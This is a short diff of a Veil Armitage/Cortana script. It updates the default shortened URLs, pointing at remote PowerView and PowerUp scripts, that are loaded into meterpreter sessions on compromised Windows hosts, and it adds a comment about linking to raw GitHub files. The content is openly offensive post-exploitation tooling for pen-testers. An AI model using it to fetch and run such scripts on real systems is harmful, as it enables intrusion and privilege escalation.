@@ -6,6 +6,8 @@
 #
 # Prerequisite: Place the remote_powershell.rb Metasploit module in your "metasploit-framework/modules/post/windows/manage/" directory.
 #
+# If you're running a script from Github, be sure to point your shortened url to the "raw" version I.E. "https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1"
+#
 # Created by: rvrsh3ll	@424f424f
 #
 # Veil Project: https://github.com/Veil-Framework/
@@ -44,7 +46,7 @@ sub veilPowerView {
 		global('$console @commands $args $argsprompt $command $scriptUrl');
 		$console = console();
 		$console = open_console_tab("meterpreter $sid");
-		$scriptUrl = prompt_text("URL to the PowerView script", "http://bit.ly/1mYPUO4");
+		$scriptUrl = prompt_text("URL to the PowerView script", "http://bit.ly/1ABN58S");
 		
 		
 		@commands = @(
@@ -119,7 +121,7 @@ sub veilPowerUp {
 		global('$console @commands $args $argsprompt $command $vpvuri $scriptUrl');
 		$console = console();
 		$console = open_console_tab("meterpreter $sid");
-		$scriptUrl = prompt_text("URL to the PowerUp script", "http://bit.ly/1mK64oH");
+		$scriptUrl = prompt_text("URL to the PowerUp script", "http://bit.ly/1AFWjAZ");
 		
 				
 		
